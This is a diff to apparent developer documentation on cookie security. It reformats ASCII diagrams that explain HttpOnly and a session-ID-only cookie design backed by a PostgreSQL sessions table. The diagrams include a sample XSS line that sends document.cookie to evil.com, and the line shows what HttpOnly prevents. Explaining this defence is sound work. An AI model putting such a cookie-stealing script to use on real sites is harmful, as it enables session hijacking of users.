@@ -58,38 +58,36 @@ The browser stores this and sends it back on every subsequent request to that do
 
 ### HttpOnly in depth
 
-```
-  Without HttpOnly:
-  ┌─────────────────────────────────────────┐
-  │  Browser                                │
-  │                                         │
-  │  Cookie: session=abc123                 │
-  │      ↑                                  │
-  │      ├── Server can read it  ✓          │
-  │      └── JavaScript can read it  ✓      │
-  │          document.cookie → "session=abc" │
-  │                                         │
-  │  XSS attack script:                     │
-  │  fetch("https://evil.com/?c=" +         │
-  │        document.cookie)                 │
-  │  → Session stolen!                      │
-  └─────────────────────────────────────────┘
+```text
+Without HttpOnly:
 
-  With HttpOnly:
-  ┌─────────────────────────────────────────┐
-  │  Browser                                │
-  │                                         │
-  │  Cookie: session=abc123 (HttpOnly)      │
-  │      ↑                                  │
-  │      ├── Server can read it  ✓          │
-  │      └── JavaScript can read it  ✗      │
-  │          document.cookie → ""           │
-  │                                         │
-  │  XSS attack script:                     │
-  │  fetch("https://evil.com/?c=" +         │
-  │        document.cookie)                 │
-  │  → Empty string. Session safe.          │
-  └─────────────────────────────────────────┘
+   Browser
+
+   Cookie: session=abc123
+       ↑
+           Server can read it  ✓
+           JavaScript can read it  ✓
+           document.cookie → "session=abc"
+
+   XSS attack script:
+   fetch("https://evil.com/?c=" +
+         document.cookie)
+   → Session stolen!
+
+With HttpOnly:
+
+   Browser
+
+   Cookie: session=abc123 (HttpOnly)
+       ↑
+           Server can read it  ✓
+           JavaScript can read it  ✗
+           document.cookie → ""
+
+   XSS attack script:
+   fetch("https://evil.com/?c=" +
+         document.cookie)
+   → Empty string. Session safe.
 ```
 
 ### SameSite in depth
@@ -120,17 +118,16 @@ volta uses exactly one cookie for authentication: `__volta_session`.
 
 The cookie itself only contains a session ID (a UUID). It does NOT contain user data, roles, tenant information, or anything else. All session data lives in the PostgreSQL `sessions` table:
 
-```
-  Browser cookie:              Server (sessions table):
-  ┌────────────────────┐       ┌─────────────────────────────┐
-  │ 550e8400-e29b-...  │ ───── │ id: 550e8400-e29b-...       │
-  └────────────────────┘       │ user_id: user-uuid           │
-                               │ tenant_id: tenant-uuid       │
-    Just a key.                │ expires_at: 2026-03-31T17:00 │
-    No data.                   │ ip_address: 192.168.1.1      │
-    Not useful without         │ user_agent: Chrome/...       │
-    the server.                │ csrf_token: Kj8mX2pQ...     │
-                               └─────────────────────────────┘
+```text
+Browser cookie:              Server (sessions table):
+
+  550e8400-e29b-...            id: 550e8400-e29b-...
+                               user_id: user-uuid
+                               tenant_id: tenant-uuid
+  Just a key.                  expires_at: 2026-03-31T17:00
+  No data.                     ip_address: 192.168.1.1
+  Not useful without           user_agent: Chrome/...
+  the server.                  csrf_token: Kj8mX2pQ...
 ```
 
 This design means:
